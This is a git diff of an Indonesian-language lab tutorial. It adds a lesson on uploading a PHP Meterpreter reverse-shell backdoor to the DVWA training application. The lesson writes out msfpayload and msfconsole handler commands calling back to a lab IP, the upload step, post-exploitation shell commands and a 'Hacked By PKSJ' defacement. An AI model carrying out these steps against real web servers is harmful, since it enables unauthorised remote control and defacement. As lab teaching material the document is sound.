@@ -231,8 +231,50 @@ Ket : sesuaikan data dengan langkah ke 4
 Gambar 22
 ### Lesson 8: Upload PHP Backdoor Payload
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Jalankan perintah :
+```
 
+    mkdir -p /root/backdoor
+    cd /root/backdoor
+    msfpayload php/meterpreter/reverse_tcp LHOST=10.0.1.102 LPORT=4444 R > PHONE_HOME.php
+    ls -l PHONE_HOME.php
+
+```
+Ket = 10.0.1.102 ip backtrack
+
+2. Buka file PHONE_HOME.php , dan hilangkan tanda # di baris awal file
+3. Buka terminal dan ketikkan msfconsole
+4. Jalankan perintah berikut
+```
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.1.102
+set LPORT 4444
+exploit
+```
+Gambar 23
+
+5. Login ke DVWA, Masuk ke menu Upload. dan upload PHONE_HOME.php. Jika berhasil akan seperti gambar :
+Gambar 24
+
+6. Buka http://10.0.1.100/dvwa/hackable/uploads/ dan klik PHONE_HOME.php. Jika berhasil akan seperti gambar
+
+Gambar 25
+
+7. Jalankan perintah :
+```
+    shell        
+    uptime
+    pwd
+    whoami
+    w
+    echo "Hacked By PKSJ" > hacked.html
+    ls -l
+```
+Gambar 26
+8. Jika berhasil maka file hacked.html sudah ada di DVWA
+
+Gambar 27
 ### Lesson 9: Cross Site Scripting (XSS)
 
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
